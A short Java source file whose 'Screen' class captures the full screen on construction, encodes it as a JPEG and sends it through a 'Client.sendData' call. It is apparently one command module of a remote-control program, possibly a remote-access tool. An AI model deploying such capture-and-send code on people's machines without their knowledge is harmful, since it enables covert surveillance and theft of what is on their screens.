
import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;

public class Screen extends State {


    public Screen(Context context) {
        super(context);
        try {
            doAction();
        } catch (AWTException | IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    void doAction() throws AWTException, IOException {
        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture = new Robot().createScreenCapture(screenRect);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ImageIO.write(capture, "jpg", baos);
        baos.flush();
        byte[] x = baos.toByteArray();
        result.put(1,x);
        Client.sendData(result);
        context.setState(0);

    }

    }
